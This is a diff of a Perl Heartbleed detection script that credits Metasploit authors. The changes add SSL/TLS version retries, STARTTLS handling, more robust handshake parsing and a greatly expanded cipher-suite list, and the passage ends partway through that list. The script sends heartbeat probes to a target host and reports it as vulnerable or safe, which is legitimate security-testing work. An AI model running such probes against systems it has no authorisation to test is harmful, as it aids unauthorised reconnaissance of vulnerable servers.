@@ -2,14 +2,14 @@
 
 ## Copyright (c) 2014, Daniel Heironimus  <aksfjh at gmail dot com>
 ## All rights reserved.
-## Redistribution and use in source and binary forms, with or without 
+## Redistribution and use in source and binary forms, with or without
 ## modification, are permitted provided that the following conditions are met:
 ##
-## 1. Redistributions of source code must retain the above copyright notice, 
+## 1. Redistributions of source code must retain the above copyright notice,
 ## this list of conditions and the following disclaimer.
 ##
 ## 2. Redistributions in binary form must reproduce the above copyright notice,
-## this list of conditions and the following disclaimer in the documentation 
+## this list of conditions and the following disclaimer in the documentation
 ## and/or other materials provided with the distribution.
 ##
 ## THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
@@ -37,7 +37,10 @@
 ## Christian Mehlmauer - Metasploit module
 ## wvu - Metasploit module
 ## juan vazquez - Metasploit module
-## Sebastiano Di Paola - Metasploit module 
+## Sebastiano Di Paola - Metasploit module
+
+## Update April 17, 2014: Addressed bugs brought up by Shannon Simpson and Adrian Hayter
+## http://www.hut3.net/blog/cns---networks-security/2014/04/14/bugs-in-heartbleed-detection-scripts-
 
 use strict;
 use warnings;
@@ -60,46 +63,53 @@ sub start_check {
     my $sock;
 
     if ( isnull( $Options{'h'} ) ) {
-        debug( 0, "No IP specified" );
+        debug( 0, "Error - No IP specified" );
         return;
     }
     if ( isnull( $Options{'p'} ) ) {
-        debug( 0, "No Port specified" );
-        return;
+        debug( 2, "Error - No Port specified, defaulting to 443" );
+        $Options{'p'} = 443;
     }
-    eval { $sock = getSocket( $Options{'h'}, $Options{'p'} ); };
-    if ($@) {
-        debug( 0, "Couldn't create socket: " . $@ );
-        return;
-    }
-
-    my $data;
-
-    if ( notnull( $Options{'o'} ) ) {
-        if ( !tls_check( $sock, $Options{'o'} ) ) {
-            debug( 0, "Start TLS failed" );
+    my $ssltls = 0;
+    while ( $ssltls < 3 ) {
+        eval { $sock = getSocket( $Options{'h'}, $Options{'p'} ); };
+        if ($@) {
+            debug( 0, "Error - Couldn't create socket: " . $@ );
             return;
         }
-    }
 
-    my $hello     = buildHello();
-    my $heartbeat = buildHeartbeat();
+        my $data;
 
-    writePacket( $sock, $hello );
-    if ( !readSSL($sock) ) {
-        debug( 1, "SSL Hello - Cannot establish connection" );
-        close $sock;
-        return;
-    }
-    debug( 2, "Starting heartbeat request" );
-    writePacket( $sock, $heartbeat );
+        if ( notnull( $Options{'o'} ) ) {
+            if ( !tls_check( $sock, $Options{'o'} ) ) {
+                debug( 0, "Start TLS failed" );
+                return;
+            }
+        }
 
-    if ( readSSL($sock) ) {
-        print $Options{'h'} . q{:}
-            . $Options{'p'}
-            . ( $Options{'o'} ? $Options{'o'} : q{} )
-            . q{ VULNERABLE} . "\n";
+        my $hello     = buildHello($ssltls);
+        my $heartbeat = buildHeartbeat($ssltls);
+
+        writePacket( $sock, $hello );
+        if ( !readSSL($sock) ) {
+            debug( 1, "SSL Hello - Cannot establish connection" );
+            close $sock;
+            $ssltls++;
+            next;
+        }
+        debug( 2, "Starting heartbeat request" );
+        writePacket( $sock, $heartbeat );
+
+        if ( readSSL($sock) ) {
+            print $Options{'h'} . q{:}
+                . $Options{'p'}
+                . ( $Options{'o'} ? $Options{'o'} : q{} )
+                . q{ VULNERABLE} . "\n";
+            return;
+        }
+        $ssltls++;
     }
+    print "SAFE\n";
 }    # END start_check
 
 sub writePacket {
@@ -140,7 +150,7 @@ sub readPacket {
         debug( 2, "0 bytes read from socket" );
         return '\0';
     }
-    debug( 2, "" . length($data) . " bytes read from socket" );
+    debug( 2, length($data) . " bytes read from socket" );
     return $data;
 }    # END readPacket
 
@@ -150,15 +160,15 @@ sub getSocket {
         $port =~ s/.*?(\d+).*?/$1/;
     }
     if ( !$port or !$host ) {
-        debug( 0, "No host and/or port" );
+        debug( 0, "Error - No host and/or port" );
         return;
     }
     debug( 2, "Creating socket to $host:$port" );
     socket( my $socket, AF_INET, SOCK_STREAM, 0 )
-        or die( "Can't create socket" );
+        or die("Can't create socket");
 
     connect( $socket, pack_sockaddr_in( $port, inet_aton($host) ) )
-        or die( "Can't connect to socket" );
+        or die("Can't connect to socket");
     debug( 2, "Connection successful" );
     return $socket;
 }    # END getSocket
@@ -168,31 +178,19 @@ sub tls_check {
     $proto =~ s/\s//g;
     my $data = q{};
     if ( !$sock ) {
-        debug( 0, "func - TLS - No socket" );
+        debug( 0, "Error - TLS - No socket" );
         return;
     }
     if ( !$proto ) {
-        debug( 0, "func - TLS - No TLS protocol specified" );
+        debug( 0, "Error - TLS - No TLS protocol specified" );
         return;
     }
     debug( 2, "Starting TLS connection - $proto" );
-    my %ack = (
-        smtp => '^220\s',
-        ftp  => '^220\s',
-        imap => '^\*\s',
-        pop3 => '^\+OK\s',
-    );
     my %request = (
         smtp => "STARTTLS\r\n",
         ftp  => "AUTH TLS\r\n",
         imap => "a001 STARTTLS\r\n",
         pop3 => "STLS\r\n",
-    );
-    my %greeting = (
-        smtp => '^220\s',
-        ftp  => '^234\s',
-        imap => '^a001\sOK\s',
-        pop3 => '^\+\sOK\s',
     );
     if ( $proto =~ m/^ftp$/i ) {
         $data = readPacket($sock);
@@ -256,8 +254,8 @@ sub tls_check {
         }
     }
     else {
-        debug( 0, "Unknown TLS service!" );
-        return;
+        debug( 1, "Unknown TLS service, trying default https" );
+        return 1;
     }
     return 1;
 }    # END tls_check
@@ -266,9 +264,10 @@ sub readSSL {
     my $sock       = shift @_;
     my $payload    = shift @_;
     my $hello_done = pack( "H*", '0e000000' );
-    my ( $data, $type, $header, $tls_ver, $data_length ) = q{} x 5;
+    my ( $data, $type, $header, $tls_ver, $data_length, $data_left )
+        = q{} x 6;
     $header = readPacket( $sock, 5 );
-    if (!$header ){
+    if ( !$header ) {
         debug( 0, "Error - Server did not reply" );
     }
     if ( length $header < 5 ) {
@@ -278,6 +277,7 @@ sub readSSL {
     $type        = unpack( "C*", substr( $header, 0, 1 ) );
     $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
     $data_length = unpack( "n*", substr( $header, 3, 2 ) );
+    $data_left   = $data_length;
     if ( $type == 21 ) {
         $data = readPacket( $sock, $data_length );
         close $sock;
@@ -292,23 +292,38 @@ sub readSSL {
     debug( 3, "Data Length - $data_length" );
     if ( $type == 22 ) {
         $header = readPacket( $sock, 4 );
+        $data_left -= 4;
         if ( unpack( "C*", substr( $header, 0, 1 ) ) != 2 ) {
             return 0;
         }
         $data_length = unpack( "n*", substr( $header, 2, 2 ) );
-        $data   = readPacket( $sock, $data_length );
+        $data = readPacket( $sock, $data_length );
+        $data_left -= $data_length;
         $header = readPacket( $sock, 5 );
-        while ($header) {
+        while ( $header and length $header > 4 ) {
             $type        = unpack( "C*", substr( $header, 0, 1 ) );
             $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
             $data_length = unpack( "n*", substr( $header, 3, 2 ) );
+            $data_left = ( $data_left ? $data_left - 5 : $data_length );
             debug( 3, "Type - $type" );
             debug( 3, "TLS Version - $tls_ver" );
             debug( 3, "Data Length - $data_length" );
             $data = readPacket( $sock, $data_length );
+
+            if ( $data_length <= $data_left ) {
+                $data = readPacket( $sock, $data_length );
+                $data_left -= $data_length;
+            }
+            else {
+                debug( 2,
+                    "Unknown reply, clearing buffer and attempting to recover"
+                );
+                $data = readPacket( $sock, $data_left );
+                $data = substr( $data, 0, -5 );
+            }
             if ( $data eq $hello_done ) {
-                debug(3, "Server hello complete");
-                last; 
+                debug( 3, "Server hello complete" );
+                last;
             }
             $header = readPacket( $sock, 5 );
         }
@@ -342,58 +357,327 @@ sub readSSL {
 
 sub buildHello {
     ### Note: Data is gathered as hex and then packed
+    my $ssltls = shift @_;
+
     my @ciphers = (    # Cipher list, 64 bit (8 byte) identifiers
-        'c014',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
-        'c00a',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
-        'c022',        # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
-        'c021',        # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
-        '0039',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
-        '0038',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
-        '0088',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
-        '0087',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
-        '0087',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
-        'c00f',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
-        '0035',        # TLS_RSA_WITH_AES_256_CBC_SHA
-        '0084',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
-        'c012',        # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
-        'c008',        # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
-        'c01c',        # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
-        'c01b',        # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
-        '0016',        # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
-        '0013',        # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
-        'c00d',        # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
-        'c003',        # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
-        '000a',        # TLS_RSA_WITH_3DES_EDE_CBC_SHA
-        'c013',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
-        'c009',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
-        'c01f',        # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
-        'c01e',        # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
-        '0033',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
-        '0032',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
-        '009a',        # TLS_DHE_RSA_WITH_SEED_CBC_SHA
-        '0099',        # TLS_DHE_DSS_WITH_SEED_CBC_SHA
-        '0045',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
-        '0044',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
-        'c00e',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
-        'c004',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
-        '002f',        # TLS_RSA_WITH_AES_128_CBC_SHA
-        '0096',        # TLS_RSA_WITH_SEED_CBC_SHA
-        '0041',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
-        'c011',        # TLS_ECDHE_RSA_WITH_RC4_128_SHA
-        'c007',        # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
-        'c00c',        # TLS_ECDH_RSA_WITH_RC4_128_SHA
-        'c002',        # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
-        '0005',        # TLS_RSA_WITH_RC4_128_SHA
-        '0004',        # TLS_RSA_WITH_RC4_128_MD5
-        '0015',        # TLS_DHE_RSA_WITH_DES_CBC_SHA
-        '0012',        # TLS_DHE_DSS_WITH_DES_CBC_SHA
-        '0009',        # TLS_RSA_WITH_DES_CBC_SHA
-        '0014',        # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
-        '0011',        # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
-        '0008',        # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
-        '0006',        # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+        '0000',        # TLS_NULL_WITH_NULL_NULL
+        '0001',        # TLS_RSA_WITH_NULL_MD5
+        '0002',        # TLS_RSA_WITH_NULL_SHA
         '0003',        # TLS_RSA_EXPORT_WITH_RC4_40_MD5
-        '00ff',        # Unknown
+        '0004',        # TLS_RSA_WITH_RC4_128_MD5
+        '0005',        # TLS_RSA_WITH_RC4_128_SHA
+        '0006',        # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+        '0007',        # TLS_RSA_WITH_IDEA_CBC_SHA
+        '0008',        # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
+        '0009',        # TLS_RSA_WITH_DES_CBC_SHA
+        '000A',        # TLS_RSA_WITH_3DES_EDE_CBC_SHA
+        '000B',        # TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA
+        '000C',        # TLS_DH_DSS_WITH_DES_CBC_SHA
+        '000D',        # TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA
+        '000E',        # TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA
+        '000F',        # TLS_DH_RSA_WITH_DES_CBC_SHA
+        '0010',        # TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA
+        '0011',        # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
+        '0012',        # TLS_DHE_DSS_WITH_DES_CBC_SHA
+        '0013',        # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
+        '0014',        # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+        '0015',        # TLS_DHE_RSA_WITH_DES_CBC_SHA
+        '0016',        # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+        '0017',        # TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
+        '0018',        # TLS_DH_anon_WITH_RC4_128_MD5
+        '0019',        # TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
+        '001A',        # TLS_DH_anon_WITH_DES_CBC_SHA
+        '001B',        # TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
+        '001E',        # TLS_KRB5_WITH_DES_CBC_SHA
+        '001F',        # TLS_KRB5_WITH_3DES_EDE_CBC_SHA
+        '0020',        # TLS_KRB5_WITH_RC4_128_SHA
+        '0021',        # TLS_KRB5_WITH_IDEA_CBC_SHA
+        '0022',        # TLS_KRB5_WITH_DES_CBC_MD5
+        '0023',        # TLS_KRB5_WITH_3DES_EDE_CBC_MD5
+        '0024',        # TLS_KRB5_WITH_RC4_128_MD5
+        '0025',        # TLS_KRB5_WITH_IDEA_CBC_MD5
+        '0026',        # TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
+        '0027',        # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA
+        '0028',        # TLS_KRB5_EXPORT_WITH_RC4_40_SHA
+        '0029',        # TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
+        '002A',        # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5
+        '002B',        # TLS_KRB5_EXPORT_WITH_RC4_40_MD5
+        '002C',        # TLS_PSK_WITH_NULL_SHA
+        '002D',        # TLS_DHE_PSK_WITH_NULL_SHA
+        '002E',        # TLS_RSA_PSK_WITH_NULL_SHA
+        '002F',        # TLS_RSA_WITH_AES_128_CBC_SHA
+        '0030',        # TLS_DH_DSS_WITH_AES_128_CBC_SHA
+        '0031',        # TLS_DH_RSA_WITH_AES_128_CBC_SHA
+        '0032',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
+        '0033',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+        '0034',        # TLS_DH_anon_WITH_AES_128_CBC_SHA
+        '0035',        # TLS_RSA_WITH_AES_256_CBC_SHA
+        '0036',        # TLS_DH_DSS_WITH_AES_256_CBC_SHA
+        '0037',        # TLS_DH_RSA_WITH_AES_256_CBC_SHA
+        '0038',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
+        '0039',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+        '003A',        # TLS_DH_anon_WITH_AES_256_CBC_SHA
+        '003B',        # TLS_RSA_WITH_NULL_SHA256
+        '003C',        # TLS_RSA_WITH_AES_128_CBC_SHA256
+        '003D',        # TLS_RSA_WITH_AES_256_CBC_SHA256
+        '003E',        # TLS_DH_DSS_WITH_AES_128_CBC_SHA256
+        '003F',        # TLS_DH_RSA_WITH_AES_128_CBC_SHA256
+        '0040',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
+        '0041',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
+        '0042',        # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA
+        '0043',        # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA
+        '0044',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
+        '0045',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
+        '0046',        # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA
+        '0067',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
+        '0068',        # TLS_DH_DSS_WITH_AES_256_CBC_SHA256
+        '0069',        # TLS_DH_RSA_WITH_AES_256_CBC_SHA256
+        '006A',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
+        '006B',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
+        '006C',        # TLS_DH_anon_WITH_AES_128_CBC_SHA256
+        '006D',        # TLS_DH_anon_WITH_AES_256_CBC_SHA256
+        '0084',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
+        '0085',        # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA
+        '0086',        # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA
+        '0087',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
+        '0088',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
+        '0089',        # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA
+        '008A',        # TLS_PSK_WITH_RC4_128_SHA
+        '008B',        # TLS_PSK_WITH_3DES_EDE_CBC_SHA
+        '008C',        # TLS_PSK_WITH_AES_128_CBC_SHA
+        '008D',        # TLS_PSK_WITH_AES_256_CBC_SHA
+        '008E',        # TLS_DHE_PSK_WITH_RC4_128_SHA
+        '008F',        # TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA
+        '0090',        # TLS_DHE_PSK_WITH_AES_128_CBC_SHA
+        '0091',        # TLS_DHE_PSK_WITH_AES_256_CBC_SHA
+        '0092',        # TLS_RSA_PSK_WITH_RC4_128_SHA
+        '0093',        # TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA
+        '0094',        # TLS_RSA_PSK_WITH_AES_128_CBC_SHA
+        '0095',        # TLS_RSA_PSK_WITH_AES_256_CBC_SHA
+        '0096',        # TLS_RSA_WITH_SEED_CBC_SHA
+        '0097',        # TLS_DH_DSS_WITH_SEED_CBC_SHA
+        '0098',        # TLS_DH_RSA_WITH_SEED_CBC_SHA
+        '0099',        # TLS_DHE_DSS_WITH_SEED_CBC_SHA
+        '009A',        # TLS_DHE_RSA_WITH_SEED_CBC_SHA
+        '009B',        # TLS_DH_anon_WITH_SEED_CBC_SHA
+        '009C',        # TLS_RSA_WITH_AES_128_GCM_SHA256
+        '009D',        # TLS_RSA_WITH_AES_256_GCM_SHA384
+        '009E',        # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
+        '009F',        # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
+        '00A0',        # TLS_DH_RSA_WITH_AES_128_GCM_SHA256
+        '00A1',        # TLS_DH_RSA_WITH_AES_256_GCM_SHA384
+        '00A2',        # TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
+        '00A3',        # TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
+        '00A4',        # TLS_DH_DSS_WITH_AES_128_GCM_SHA256
+        '00A5',        # TLS_DH_DSS_WITH_AES_256_GCM_SHA384
+        '00A6',        # TLS_DH_anon_WITH_AES_128_GCM_SHA256
+        '00A7',        # TLS_DH_anon_WITH_AES_256_GCM_SHA384
+        '00A8',        # TLS_PSK_WITH_AES_128_GCM_SHA256
+        '00A9',        # TLS_PSK_WITH_AES_256_GCM_SHA384
+        '00AA',        # TLS_DHE_PSK_WITH_AES_128_GCM_SHA256
+        '00AB',        # TLS_DHE_PSK_WITH_AES_256_GCM_SHA384
+        '00AC',        # TLS_RSA_PSK_WITH_AES_128_GCM_SHA256
+        '00AD',        # TLS_RSA_PSK_WITH_AES_256_GCM_SHA384
+        '00AE',        # TLS_PSK_WITH_AES_128_CBC_SHA256
+        '00AF',        # TLS_PSK_WITH_AES_256_CBC_SHA384
+        '00B0',        # TLS_PSK_WITH_NULL_SHA256
+        '00B1',        # TLS_PSK_WITH_NULL_SHA384
+        '00B2',        # TLS_DHE_PSK_WITH_AES_128_CBC_SHA256
+        '00B3',        # TLS_DHE_PSK_WITH_AES_256_CBC_SHA384
+        '00B4',        # TLS_DHE_PSK_WITH_NULL_SHA256
+        '00B5',        # TLS_DHE_PSK_WITH_NULL_SHA384
+        '00B6',        # TLS_RSA_PSK_WITH_AES_128_CBC_SHA256
+        '00B7',        # TLS_RSA_PSK_WITH_AES_256_CBC_SHA384
+        '00B8',        # TLS_RSA_PSK_WITH_NULL_SHA256
+        '00B9',        # TLS_RSA_PSK_WITH_NULL_SHA384
+        '00BA',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256
+        '00BB',        # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256
+        '00BC',        # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256
+        '00BD',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256
+        '00BE',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
+        '00BF',        # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256
+        '00C0',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256
+        '00C1',        # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256
+        '00C2',        # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256
+        '00C3',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256
+        '00C4',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256
+        '00C5',        # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256
+        '00FF',        # TLS_EMPTY_RENEGOTIATION_INFO_SCSV
+        'C001',        # TLS_ECDH_ECDSA_WITH_NULL_SHA
+        'C002',        # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+        'C003',        # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+        'C004',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+        'C005',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+        'C006',        # TLS_ECDHE_ECDSA_WITH_NULL_SHA
+        'C007',        # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+        'C008',        # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+        'C009',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+        'C00A',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+        'C00B',        # TLS_ECDH_RSA_WITH_NULL_SHA
+        'C00C',        # TLS_ECDH_RSA_WITH_RC4_128_SHA
+        'C00D',        # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+        'C00E',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+        'C00F',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+        'C010',        # TLS_ECDHE_RSA_WITH_NULL_SHA
+        'C011',        # TLS_ECDHE_RSA_WITH_RC4_128_SHA
+        'C012',        # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+        'C013',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+        'C014',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+        'C015',        # TLS_ECDH_anon_WITH_NULL_SHA
+        'C016',        # TLS_ECDH_anon_WITH_RC4_128_SHA
+        'C017',        # TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA
+        'C018',        # TLS_ECDH_anon_WITH_AES_128_CBC_SHA
+        'C019',        # TLS_ECDH_anon_WITH_AES_256_CBC_SHA
+        'C01A',        # TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA
+        'C01B',        # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
+        'C01C',        # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
+        'C01D',        # TLS_SRP_SHA_WITH_AES_128_CBC_SHA
+        'C01E',        # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
+        'C01F',        # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
+        'C020',        # TLS_SRP_SHA_WITH_AES_256_CBC_SHA
+        'C021',        # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
+        'C022',        # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
+        'C023',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
+        'C024',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
+        'C025',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
+        'C026',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
+        'C027',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
+        'C028',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
+        'C029',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
+        'C02A',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
+        'C02B',        # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
+        'C02C',        # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
+        'C02D',        # TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
+        'C02E',        # TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
+        'C02F',        # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+        'C030',        # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+        'C031',        # TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
+        'C032',        # TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
+        'C033',        # TLS_ECDHE_PSK_WITH_RC4_128_SHA
+        'C034',        # TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA
+        'C035',        # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA
+        'C036',        # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA
+        'C037',        # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256
+        'C038',        # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384
+        'C039',        # TLS_ECDHE_PSK_WITH_NULL_SHA
+        'C03A',        # TLS_ECDHE_PSK_WITH_NULL_SHA256
+        'C03B',        # TLS_ECDHE_PSK_WITH_NULL_SHA384
+        'C03C',        # TLS_RSA_WITH_ARIA_128_CBC_SHA256
+        'C03D',        # TLS_RSA_WITH_ARIA_256_CBC_SHA384
+        'C03E',        # TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256
+        'C03F',        # TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384
+        'C040',        # TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256
+        'C041',        # TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384
+        'C042',        # TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256
+        'C043',        # TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384
+        'C044',        # TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256
+        'C045',        # TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384
+        'C046',        # TLS_DH_anon_WITH_ARIA_128_CBC_SHA256
+        'C047',        # TLS_DH_anon_WITH_ARIA_256_CBC_SHA384
+        'C048',        # TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256
+        'C049',        # TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384
+        'C04A',        # TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256
+        'C04B',        # TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384
+        'C04C',        # TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256
+        'C04D',        # TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384
+        'C04E',        # TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256
+        'C04F',        # TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384
+        'C050',        # TLS_RSA_WITH_ARIA_128_GCM_SHA256
+        'C051',        # TLS_RSA_WITH_ARIA_256_GCM_SHA384
+        'C052',        # TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256
+        'C053',        # TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384
+        'C054',        # TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256
+        'C055',        # TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384
+        'C056',        # TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256
+        'C057',        # TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384
+        'C058',        # TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256
+        'C059',        # TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384
+        'C05A',        # TLS_DH_anon_WITH_ARIA_128_GCM_SHA256
+        'C05B',        # TLS_DH_anon_WITH_ARIA_256_GCM_SHA384
+        'C05C',        # TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256
+        'C05D',        # TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384
+        'C05E',        # TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256
+        'C05F',        # TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384
+        'C060',        # TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256
+        'C061',        # TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384
+        'C062',        # TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256
